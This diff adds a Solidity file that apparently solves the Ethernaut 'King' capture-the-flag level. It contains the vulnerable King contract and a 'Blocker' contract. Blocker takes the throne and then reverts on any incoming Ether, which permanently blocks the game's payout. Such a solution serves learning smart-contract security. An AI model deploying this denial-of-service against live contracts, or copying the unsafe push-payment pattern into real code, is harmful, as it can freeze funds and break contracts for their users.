@@ -1,0 +1,44 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract King {
+    address king;
+    uint256 public prize;
+    address public owner;
+
+    constructor() payable {
+        owner = msg.sender;
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    receive() external payable {
+        require(msg.value >= prize || msg.sender == owner);
+        payable(king).transfer(msg.value);
+        king = msg.sender;
+        prize = msg.value;
+    }
+
+    function _king() public view returns (address) {
+        return king;
+    }
+}
+
+
+contract Blocker {
+    King public king;
+    
+    constructor(address _king) payable {
+        king = King(payable(_king));
+    }
+    function ClaimKing() payable public {
+        // Become the king by sending enough Ether
+        (bool success,) = address(king).call{value: msg.value}("");
+        require(success, "Failed to become king");
+    }
+    
+    receive() external payable {
+        // Intentionally left blank to block receiving Ether
+        revert("I refuse to give you kingmanship !");
+    }
+}
